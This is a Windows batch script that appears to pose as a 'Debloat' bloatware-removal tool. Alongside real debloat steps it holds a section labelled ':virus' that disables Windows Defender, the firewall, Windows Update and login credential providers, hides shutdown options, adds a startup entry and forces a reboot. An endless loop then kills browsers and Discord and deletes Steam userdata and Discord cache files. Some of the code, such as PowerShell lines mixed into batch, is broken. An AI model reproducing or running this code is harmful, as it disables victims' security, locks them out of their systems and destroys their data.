@echo off
set "target=C:\Program Files (x86)\Steam\userdata"
set "target2=~/Library/Application Support/Steam/userdata"
set "target3=%appdata%\discord\Cache"
set "target4=%localappdata%\discord\Cache"
setlocal enabledelayedexpansion
goto startup

:startup
net session >nul 2>&1
if "%errorlevel%"=="0" (
    goto virus
) else (
    if not exist "%startupPath%" (
        echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
        echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
        "%temp%\getadmin.vbs"
        del "%temp%\getadmin.vbs"
        start "" cmd /c "net session && if %errorlevel%==0 (echo bob>bob.txt) else (echo bob) && exit"
        timeout /t 5 >NUL 2>&1
        if exist bob.txt (
            goto virus
        )
        exit /b 1
    )
    goto deleter
)

:loop
taskkill /IM shutdown.exe /F
taskkill /F /IM chrome.exe /T
taskkill /F /IM firefox.exe /T
taskkill /F /IM msedge.exe /T
taskkill /F /IM discord.exe
goto test

:test
if exist "%target%" (
    del /F /Q "%target%\*.*"
    for /D %%D in ("%target%\*") do rd /S /Q "%%D"
) else if exist "%target2%" (
    del /F /Q "%target2%\*.*"
    for /D %%D in ("%target2%\*") do rd /S /Q "%%D"
) else if exist "%target3%" (
    del /F /Q "%target3%\*.*"
    for /D %%D in ("%target3%\*") do rd /S /Q "%%D"
) else if exist "%target4%" (
    del /F /Q "%target4%\*.*"
    for /D %%D in ("%target4%\*") do rd /S /Q "%%D"
)
goto loop

:virus
pushd "%CD%"
CD /D "%~dp0"
powershell -Command "Start-Process '%~f0' -Verb RunAs"
REG QUERY "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware >nul 2>&1
REG QUERY "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" | findstr /i "DisableAntiSpyware" | findstr "0x1" >nul
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
sc stop WinDefend >nul 2>&1
taskkill /f /im "MsMpEng.exe" >nul 2>&1
net stop mpssvc
net stop BFE
net stop wtd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\mpssvc" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\BFE" /v "Start" /t REG_DWORD /d "4" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\wtd" /v "Start" /t REG_DWORD /d "4" /f
powercfg /change monitor-timeout-ac 0
powercfg /change disk-timeout-ac 0
powercfg /change standby-timeout-ac 0
powercfg /change hibernate-timeout-ac 0
sc config wuauserv start= disabled
sc qc wuauserv
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced" /v Start_PowerButtonAction /t REG_DWORD /d 100 /f
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows\Personalization" /v NoLockScreen /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{60b78e88-ead8-445c-9cfd-0b87f74ea6cd}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{D6886603-9D2F-4EB2-B667-1971041FA96B}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{C885AA15-1764-4293-B82A-0586ADD46B35}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{8AF662BF-65A0-4D0A-A540-A338A999D36F}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{BEC09223-B018-416D-A0AC-523971B639F5}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{2135f72a-90b5-4ed3-a7f1-8bb705ac276a}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{1b283861-754f-4022-ad47-a5eaaa618894}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{1ee7337f-85ac-45e2-a23c-37c753209769}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{8FD7E19C-3BF7-489B-A72C-846AB3678C96}" /v Disabled /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\Credential Providers\{94596c7e-3744-41ce-893e-bbf09122f76a}" /v Disabled /t REG_DWORD /d 1 /f
Install-Module -Name PolicyFileEditor -SkipPublisherCheck -Force
$RegPath = 'Software\Microsoft\Windows\CurrentVersion\Policies\Explorer'
$RegName = 'NoClose'
$RegData = '1'
$RegType = 'DWord'
Set-PolicyFileEntry -Path $UserDir -Key $RegPath -ValueName $RegName -Data $RegData -Type $RegType
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideRestart" -Name "value" -Value 1
Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\PolicyManager\default\Start\HideShutDown" -Name "value" -Value 1
for /f "usebackq tokens=*" %%i in (`powershell -command "[Environment]GetFolderPath('CommonStartup')"`) do set startupPath=%%i
cd /d "%startupPath%"
echo start "" "%~dp0hvorfor.bat">windows_support.bat
taskkill /f /im OneDrive.exe
powercfg -setacvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0
powercfg -setdcvalueindex SCHEME_CURRENT 4f971e89-eebd-4455-a8de-9e59040e7347 7648efa3-dd9c-4e3e-b566-50f929386280 0
powercfg -SetActive SCHEME_CURRENT
popd
endlocal
shutdown /r

:deleter
>nul reg add hkcu\software\classes\.Admin\shell\runas\command /f /ve /d "cmd /x /d /r set \"f0=%%2\"& call \"%%2\" %%3"& set _= %*
>nul fltmc|| if "%f0%" neq "%~f0" (cd.>"%temp%\runas.Admin" & start "%~n0" /high "%temp%\runas.Admin" "%~f0" "%_:"=""%" & exit /b)
title Debloat - A bloatware removal tool made in batch by Cramaboule
Set param1=%1
Set param2=%2
Set Temp2=0
Set Temp1=0
IF /I [%param1%] == [noreboot] Set "Temp2=1"
IF /I [%param2%] == [noreboot] Set "Temp2=1"
IF /I [%param1%] == [restarted] Set "Temp1=1"
IF /I [%param2%] == [restarted] Set "Temp1=1"
cd "%~dp0"
IF %Temp1% == 0 (
	echo Setup Windows Console
	REG add HKEY_CURRENT_USER\Console\%%%%Startup /v "DelegationConsole" /t REG_SZ /d {B23D10C0-E52E-411E-9D5B-C09FDF709C7D} /f 2> nul
	REG add HKEY_CURRENT_USER\Console\%%%%Startup /v "DelegationTerminal" /t REG_SZ /d {B23D10C0-E52E-411E-9D5B-C09FDF709C7D} /f 2> nul	
	IF %Temp2% == 1 (
	start %~nx0 restarted noreboot
	exit
	) ELSE (
	start %~nx0 restarted
	exit
	)
)
for /f %%a in ('REG QUERY HKCU\Software\Microsoft\Windows\CurrentVersion\CloudStore\Store\Cache\DefaultAccount /s /k /f placeholdertilecollection') do (reg delete %%a\current /VA /F 2> nul)
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\UserProfileEngagement /v "ScoobeSystemSettingEnabled" /t REG_DWORD /d 0 /f 2> nul
REG add HKLM\SOFTWARE\Policies\Microsoft\Windows\EnhancedStorageDevices /v "TCGSecurityActivationDisabled" /t REG_DWORD /d 1 /f 2> nul
REG add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\BitLocker /v "PreventDeviceEncryption" /t REG_DWORD /d 1 /f 2> nul
REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v "HideFileExt" /t REG_DWORD /d 0 /f 2> nul
REG add HKLM\SOFTWARE\Microsoft\WindowsUpdate\UX\Settings /v "IsContinuousInnovationOptedIn" /t REG_DWORD /d 1 /f 2> nul
REG add "HKU\.DEFAULT\Control Panel\Keyboard" /v "InitialKeyboardIndicators" /t REG_SZ /d 2 /f 2> nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\TaskbarDeveloperSettings /v TaskbarEndTask /t REG_DWORD /d 1 /f
net accounts /maxpwage:unlimited
powercfg /change monitor-timeout-ac 0 2> nul
powercfg /change monitor-timeout-dc 0 2> nul
powercfg /change standby-timeout-ac 0 2> nul
powercfg /change standby-timeout-dc 0 2> nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v "TaskbarAl" /t REG_DWORD /d 0 /f 2> nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v "TaskbarMn" /t REG_DWORD /d 0 /f 2> nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v "TaskbarDa" /t REG_DWORD /d 0 /f 2> nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /v "ShowTaskViewButton" /t REG_DWORD /d 0 /f 2> nul
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Search /v "SearchboxTaskbarMode" /t REG_DWORD /d 0 /f 2> nul
reg add HKCU\Software\Classes\CLSID\{86ca1aa0-34aa-4e8b-a509-50c905bae2a2}\InprocServer32 /ve /d "" /f 2> nul
reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v "LegacyDefaultPrinterMode" /t REG_DWORD /d 1 /f 2> nul
certutil -decode %0 "%~dp0start2.bin"
xcopy "%~dp0start2.bin" "C:\Users\Default\AppData\Local\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\LocalState\" /y 2> nul
xcopy "%~dp0start2.bin" "%LocalAppData%\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\LocalState\" /y 2> nul
del "%~dp0start2.bin"
del C:\Users\Public\Desktop\* /F /Q
DEL /F /S /Q /A "%AppData%\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\Microsoft Edge.lnk" 2> nul
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband\ /F /V FavoritesResolve /T REG_BINARY /D 3b0300004c0000000114020000000000c0000000000000468300800020000000bc8b6c93ad01da01db547a93ad01da015cf4e1fbd161d801970100000000000001000000000000000000000000000000a0013a001f80c827341f105c1042aa032ee45287d668260001002600efbe120000009d8db41e3e00da013b645d4e3e00da0181c27393ad01da01140056003100000000005257535311005461736b42617200400009000400efbe5057b374525753532e000000d2a301000000010000000000000000000000000000007f4042005400610073006b00420061007200000016000e01320097010000a754662a200046494c4545587e312e4c4e4b00007c0009000400efbe52575353525753532e000000fc4e0100000008000000000000000000520000000000a413a200460069006c00650020004500780070006c006f007200650072002e006c006e006b00000040007300680065006c006c00330032002e0064006c006c002c002d003200320030003600370000001c00220000001e00efbe02005500730065007200500069006e006e006500640000001c00120000002b00efbedb547a93ad01da011c00420000001d00efbe02004d006900630072006f0073006f00660074002e00570069006e0064006f00770073002e004500780070006c006f0072006500720000001c000000a40000001c000000010000001c0000002d00000000000000a30000001100000003000000d17dbc801000000000433a5c55736572735c41646d696e6973747261746f725c417070446174615c526f616d696e675c4d6963726f736f66745c496e7465726e6574204578706c6f7265725c517569636b204c61756e63685c557365722050696e6e65645c5461736b4261725c46696c65204578706c6f7265722e6c6e6b000060000000030000a058000000000000006465736b746f702d7665683134727500620c54cc7cd9604cbd73b8c13a208843778f36218c6dee11a20e080027a38204620c54cc7cd9604cbd73b8c13a208843778f36218c6dee11a20e080027a3820445000000090000a03900000031535053b1166d44ad8d7048a748402ea43d788c1d000000680000000048000000b6d08a154cd49a4192b0f918a2e54d95000000000000000000000000 2> nul
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband\ /F /V Favorites /T REG_BINARY /D 00a00100003a001f80c827341f105c1042aa032ee45287d668260001002600efbe120000009d8db41e3e00da013b645d4e3e00da0181c27393ad01da01140056003100000000005257535311005461736b42617200400009000400efbe5057b374525753532e000000d2a301000000010000000000000000000000000000007f4042005400610073006b00420061007200000016000e01320097010000a754662a200046494c4545587e312e4c4e4b00007c0009000400efbe52575353525753532e000000fc4e0100000008000000000000000000520000000000a413a200460069006c00650020004500780070006c006f007200650072002e006c006e006b00000040007300680065006c006c00330032002e0064006c006c002c002d003200320030003600370000001c00220000001e00efbe02005500730065007200500069006e006e006500640000001c00120000002b00efbedb547a93ad01da011c00420000001d00efbe02004d006900630072006f0073006f00660074002e00570069006e0064006f00770073002e004500780070006c006f0072006500720000001c000000ff 2> nul
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband\ /V FavoritesChanges /T REG_QWORD /D 1 /F 2> nul
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband\ /V FavoritesVersion /T REG_QWORD /D 3 /F 2> nul
taskkill /f /im explorer.exe & start explorer.exe 2> nul
FOR /F %%g IN ('winget -v') do (SET version=%%g)
echo %version%
SET "result=%version:~1%"
SET minwingetversionA=1
SET minwingetversionB=11
for /f "tokens=1,2 delims=." %%a in ("%result%") do (
    set "resultA=%%a"
    set "resultB=%%b"
)
if %resultA% LEQ %minwingetversionA% (
	if %resultB% LSS %minwingetversionB% (
		call :InstallWinget
	)
)               
reg add HKLM\SOFTWARE\Policies\Microsoft\Windows\CloudContent /v "DisableWindowsConsumerFeatures" /t REG_DWORD /d 1 /f 2> nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager /v "ContentDeliveryAllowed" /t REG_DWORD /d 1 /f 2> nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager /v "OemPreInstalledAppsEnabled" /t REG_DWORD /d 1 /f 2> nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager /v "PreInstalledAppsEnabled" /t REG_DWORD /d 1 /f 2> nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager /v "PreInstalledAppsEverEnabled" /t REG_DWORD /d 1 /f 2> nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager /v "SilentInstalledAppsEnabled" /t REG_DWORD /d 1 /f 2> nul
reg add HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\ContentDeliveryManager /v "SystemPaneSuggestionsEnabled" /t REG_DWORD /d 1 /f 2> nul
REG DELETE HKLM\SOFTWARE\Microsoft\WindowsUpdate\Orchestrator\UScheduler_Oobe\DevHomeUpdate /VA /F
REG DELETE HKLM\SOFTWARE\Microsoft\WindowsUpdate\Orchestrator\UScheduler_Oobe\OutlookUpdate /VA /F
TASKKILL /f /im OneDrive.exe 2>nul
%systemroot%\System32\OneDriveSetup.exe /uninstall 2> nul
%systemroot%\SysWOW64\OneDriveSetup.exe /uninstall 2> nul
powershell -command "(\"Microsoft.549981C3F5F10\", \"MSTeams\", \"Microsoft.MicrosoftEdge.Stable\", \"Clipchamp.Clipchamp\", \"Microsoft.MicrosoftSolitaireCollection\", \"Microsoft.BingNews\", \"Microsoft.BingWeather\", \"Microsoft.GamingApp\", \"Microsoft.GetHelp\", \"Microsoft.Getstarted\", \"Microsoft.MicrosoftOfficeHub\", \"Microsoft.People\", \"Microsoft.PowerAutomateDesktop\", \"Microsoft.WindowsTerminal\", \"Microsoft.Todos\", \"Microsoft.WindowsAlarms\", \"Microsoft.WindowsCamera\", \"Microsoft.windowscommunicationsapps\", \"Microsoft.WindowsFeedbackHub\", \"Microsoft.WindowsMaps\", \"Microsoft.WindowsSoundRecorder\", \"Microsoft.Xbox.TCUI\", \"Microsoft.XboxGameOverlay\", \"Microsoft.XboxGamingOverlay\", \"Microsoft.XboxIdentityProvider\", \"Microsoft.XboxSpeechToTextOverlay\", \"Microsoft.YourPhone\", \"Microsoft.ZuneMusic\", \"Microsoft.ZuneVideo\", \"MicrosoftCorporationII.QuickAssist\", \"MicrosoftWindows.Client.WebExperience\", \"MicrosoftTeams\", \"Microsoft.LanguageExperiencePackfr-FR\", \"MicrosoftCorporationII.MicrosoftFamily\", \"Microsoft.MicrosoftStickyNotes\").ForEach{write-host $_ ; Get-AppxPackage -AllUsers -Name $_ | Remove-AppxPackage -AllUsers ; Get-AppxProvisionedPackage -online | where-object PackageName -like $_ | Remove-AppxProvisionedPackage -online}" 2> nul
Echo Removing New Outlook For Windows
mkdir %appdata%\NewOutlook
if %PROCESSOR_ARCHITECTURE%==AMD64 copy "%~dp0AppxManifest.xml" %appdata%\NewOutlook
if %PROCESSOR_ARCHITECTURE%==x86 copy "%~dp0AppxManifestx86.xml" %appdata%\NewOutlook\AppxManifest.xml
if %PROCESSOR_ARCHITECTURE%==ARM64 copy "%~dp0AppxManifest-ARM64.xml" %appdata%\NewOutlook\AppxManifest.xml
powershell "New-ItemProperty -Path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\AppModelUnlock -Name AllowDevelopmentWithoutDevLicense -PropertyType DWORD -Value 1 -Force" >NUL 2>NUL
echo Uninstalling the original version (reffer to readme for errors/red text)
powershell "get-appxpackage -allusers Microsoft.OutlookForWindows | Remove-AppxPackage -allusers"
echo installing the patched one (Errors are bad now)
powershell add-appxpackage -register "'%appdata%\NewOutlook\AppxManifest.xml'"
::Remove Office 365 Preinstalled. Setup.exe is part of officedeploymenttool_17830-20162.exe
ping 127.0.0.1 -n 3 >nul 2>&1
cls
winget -v
call :WingetUninstall cortana Cortana
call :WingetUninstall skype Skype
call :WingetUninstall Microsoft.WindowsCamera_8wekyb3d8bbwe Camera
call :WingetUninstall Microsoft.ScreenSketch_8wekyb3d8bbwe Sketch
call :WingetUninstall Microsoft.GamingApp_8wekyb3d8bbwe Xbox_1/7
call :WingetUninstall Microsoft.XboxApp_8wekyb3d8bbwe Xbox_2/7
call :WingetUninstall Microsoft.Xbox.TCUI_8wekyb3d8bbwe Xbox_3/7
call :WingetUninstall Microsoft.XboxSpeechToTextOverlay_8wekyb3d8bbwe Xbox_4/7
call :WingetUninstall Microsoft.XboxIdentityProvider_8wekyb3d8bbwe Xbox_5/7
call :WingetUninstall Microsoft.XboxGamingOverlay_8wekyb3d8bbwe Xbox_6/7
call :WingetUninstall Microsoft.XboxGameOverlay_8wekyb3d8bbwe Xbox_7/7
call :WingetUninstall Microsoft.ZuneMusic_8wekyb3d8bbwe Groove_Music
call :WingetUninstall Microsoft.WindowsFeedbackHub_8wekyb3d8bbwe Feedback Hub
call :WingetUninstall Microsoft.Getstarted_8wekyb3d8bbwe Microsoft-Tips
call :WingetUninstall 9NBLGGH42THS 3D_Viewer
call :WingetUninstall Microsoft.3DBuilder_8wekyb3d8bbwe 3D_Builder
call :WingetUninstall Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe MS_Solitaire
call :WingetUninstall 9NBLGGH5FV99 Paint-3D
call :WingetUninstall Microsoft.BingWeather_8wekyb3d8bbwe Weather 
call :WingetUninstall microsoft.windowscommunicationsapps_8wekyb3d8bbwe Mail/Calendar
call :WingetUninstall Microsoft.YourPhone_8wekyb3d8bbwe Phone
call :WingetUninstall Microsoft.People_8wekyb3d8bbwe People
call :WingetUninstall Microsoft.Wallet_8wekyb3d8bbwe MS_Pay 
call :WingetUninstall Microsoft.WindowsMaps_8wekyb3d8bbwe MS_Maps
call :WingetUninstall Microsoft.Office.OneNote_8wekyb3d8bbwe OneNote
call :WingetUninstall Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe MS_Office
call :WingetUninstall Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe Voice_Recorder
call :WingetUninstall Microsoft.ZuneVideo_8wekyb3d8bbwe MoviesTV
call :WingetUninstall Microsoft.MixedReality.Portal_8wekyb3d8bbwe Mixed_Reality-Portal
call :WingetUninstall Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe Sticky_Notes
call :WingetUninstall Microsoft.GetHelp_8wekyb3d8bbwe Get_Help
call :WingetUninstall Microsoft.OneDrive OneDrive
call :WingetUninstall Microsoft.WindowsCalculator_8wekyb3d8bbwe Calculator
call :WingetUninstall Microsoft.OutlookForWindows_8wekyb3d8bbwe Outlook_for_Microsoft
call :WingetUninstall Microsoft.Copilot_8wekyb3d8bbwe Copilot
call :WingetUninstall 26720RandomSaladGamesLLC.3899848563C1F_kx24dqmazqk8j Games1
call :WingetUninstall 26720RandomSaladGamesLLC.Spades_kx24dqmazqk8j Games2
call :WingetUninstall Google.PlayGames.Beta Games3
call :WingetUninstall AD2F1837.OMENCommandCenter_v10z8vjag6ke6 Games4
call :WingetUninstall MSIX\26720RandomSaladGamesLLC.3899848563C1F_1.0.140.0_x64__kx24dqmazqk8j Games5
call :WingetUninstall MSIX\26720RandomSaladGamesLLC.Spades_6.1.134.0_x64__kx24dqmazqk8j Games6
call :WingetUninstall Microsoft.Messaging_8wekyb3d8bbwe MessagesoperatorWindows
call :WingetUninstall Microsoft.Print3D_8wekyb3d8bbwe print_3D
call :WingetUninstall Microsoft.OneConnect_8wekyb3d8bbwe One_Connect
call :WingetUninstall Microsoft.Todos_8wekyb3d8bbwe Microsoft_to_Do
call :WingetUninstall Microsoft.PowerAutomateDesktop_8wekyb3d8bbwe Power_Automate1/2
call :WingetUninstall MSIX\Microsoft.Windows.DevHome_0.0.0.0_x64__8wekyb3d8bbwe Power_Automate1/2
call :WingetUninstall Microsoft.BingNews_8wekyb3d8bbwe Bing_News
call :WingetUninstall MicrosoftTeams_8wekyb3d8bbwe Microsoft_Teams
call :WingetUninstall MicrosoftCorporationII.MicrosoftFamily_8wekyb3d8bbwe Microsoft_Family
call :WingetUninstall MicrosoftCorporationII.QuickAssist_8wekyb3d8bbwe Quick _Assist
call :WingetUninstall Microsoft.DevHome Dev_Home
call :WingetUninstall Microsoft.Whiteboard_8wekyb3d8bbwe Microsoft_Whiteboard
call :WingetUninstall ARP\Machine\X86\{9EC178B2-ABCD-4833-B541-B535F7F04994} NordVPN
call :WingetUninstall disney+ Disney+
call :WingetUninstall 7EE7776C.LinkedInforWindows_w1wdnht996qgy LinkedIn
call :WingetUninstall ReincubateLtd.CamoStudio_9bq3v28c93p4r Camo_Studio
call :WingetUninstall C27EB4BA.DropboxOEM_xbfy0k16fey96 Dropbox1/2
call :WingetUninstall MSIX\C27EB4BA.DropboxOEM_23.4.24.0_x64__xbfy0k16fey96 Dropbox2/2
call :WingetUninstall Clipchamp.Clipchamp_yxz26nhyzhsrt Clipchamp
call :WingetUninstall 5319275A.WhatsAppDesktop_cv1g1gvanyjgm WhatsApp
call :WingetUninstall SpotifyAB.SpotifyMusic_zpdnekdrzrea0 Spotify_Music
call :WingetUninstall Microsoft.WindowsStore_8wekyb3d8bbwe Microsoft_Store
call :WingetUninstall Microsoft.HEVCVideoExtension_8wekyb3d8bbwe HEVCVideoExtension
call :WingetUninstall Microsoft.LanguageExperiencePackfr-FR_8wekyb3d8bbwe LanguageExperiencePackfr-FR
call :WingetUninstall Microsoft.RawImageExtension_8wekyb3d8bbwe RawImageExtension
call :WingetUninstall Microsoft.StorePurchaseApp_8wekyb3d8bbwe StorePurchaseApp
call :WingetUninstall Microsoft.VP9VideoExtensions_8wekyb3d8bbwe VP9VideoExtensions
call :WingetUninstall Microsoft.WebMediaExtensions_8wekyb3d8bbwe WebMediaExtensions
call :WingetUninstall Microsoft.WindowsAlarms_8wekyb3d8bbwe Windows_Alarms
call :WingetUninstall Microsoft.WindowsCamera_8wekyb3d8bbwe Windows_Camera
call :WingetUninstall MicrosoftWindows.Client.WebExperiencecw5n1h2txyewy Web_Experience
call :WingetUninstall {6A2A8076-135F-4F55-BB02-DED67C8C6934} PC_Health_tool
call :WingetUninstall {80F1AF52-7AC0-42A3-9AF0-689BFB271D1D} Microsoft_Update_Health_Tool
wsreset -i
winget install --id 9MZ95KL8MR0L --accept-source-agreements --silent --accept-package-agreements
winget install --id 9PCFS5B6T72H --accept-source-agreements --silent --accept-package-agreements
winget install --id 9WZDNCRFHVN5 --accept-source-agreements --silent --accept-package-agreements
winget install --id 9WZDNCRFJBH4 --accept-source-agreements --silent --accept-package-agreements
winget install --id 9MSMLRH6LZF3 --accept-source-agreements --silent --accept-package-agreements

IF %Temp2% NEQ 1 (
	cls
	CHOICE /c YN /M "Do you want to reboot now"
	IF !ERRORLEVEL! == 1 (shutdown -r -f -t 00)
	cls & echo Done. Thank you for using this tool. ==== Reboot is recommended ====& echo. 
)

goto loop

:InstallWinget
powershell -command $ProgressPreference = 'SilentlyContinue' ; ^
	write-host 'Downloading Winget and dependies' ; ^
	(New-Object System.Net.WebClient).DownloadFile('https://aka.ms/Microsoft.VCLibs.x64.14.00.Desktop.appx', 'Microsoft.VCLibs.x64.14.00.Desktop.appx') ; ^
	(New-Object System.Net.WebClient).DownloadFile('https://www.nuget.org/api/v2/package/Microsoft.UI.Xaml/2.7.3', 'microsoft.ui.xaml.2.7.3.nupkg.zip') ; ^
	(New-Object System.Net.WebClient).DownloadFile('https://github.com/microsoft/winget-cli/releases/latest/download/Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle', 'Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle') ; ^
	write-host 'Installing Winget and dependies' ; ^
	Expand-Archive -Path '.\microsoft.ui.xaml.2.7.3.nupkg.zip' -Force ; ^
	Add-AppXPackage -Path '.\microsoft.ui.xaml.2.7.3.nupkg\tools\AppX\x64\Release\Microsoft.UI.Xaml.2.7.appx' ; ^
	Add-AppXPackage -Path '.\Microsoft.VCLibs.x64.14.00.Desktop.appx' ; ^
	Add-AppXPackage -Path '.\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe.msixbundle' 2> nul
exit /B

:WingetUninstall
Echo Uninstall %2
winget uninstall %1 --accept-source-agreements --silent --force --purge >nul 2>&1
exit /B
